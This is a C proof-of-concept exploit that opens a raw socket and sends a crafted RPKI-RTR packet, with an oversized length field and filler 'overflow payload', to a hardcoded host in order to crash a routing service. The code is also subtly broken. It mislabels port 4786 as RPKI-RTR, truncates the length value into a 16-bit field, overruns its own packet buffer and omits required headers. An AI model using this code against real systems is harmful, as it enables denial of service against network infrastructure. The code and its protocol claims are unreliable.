#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT_RPKI 4786 // RPKI-RTR Protocol port

int main() {
    int sockfd;
    struct sockaddr_in src_addr, dst_addr;
    char packet[1024];

    // Create a raw socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("socket creation failed");
        exit(1);
    }

    // Set source and destination addresses
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(65535); // Source port
    inet_pton(AF_INET, "192.168.1.100", &src_addr.sin_addr);

    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(PORT_RPKI); // Destination port (RPKI-RTR)
    inet_pton(AF_INET, "192.168.1.200", &dst_addr.sin_addr);

    // Construct a raw packet to trigger the vulnerability
    // RPKI-RTR PDU header with crafted length and buffer overflow payload
    struct rpki_rtr_pdu {
        uint8_t pdu_type;
        uint16_t length; // Crafted length to trigger OOB read/write and crash
    } pdu_header;

    char payload[1024] = "A"; // Buffer overflow payload

    pdu_header.pdu_type = 0x01; // Any valid PDU type
    pdu_header.length = 0xFFFFFFFF; // Crafted length to trigger vulnerability

    memcpy(packet, &pdu_header, sizeof(pdu_header));
    memcpy(packet + sizeof(pdu_header), payload, 1024); // Append buffer overflow payload

    // Send the packet using sendto()
    if (sendto(sockfd, packet, sizeof(pdu_header) + 1024, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) < 0) {
        perror("packet sending failed");
        exit(1);
    }

    close(sockfd);
    return 0;
}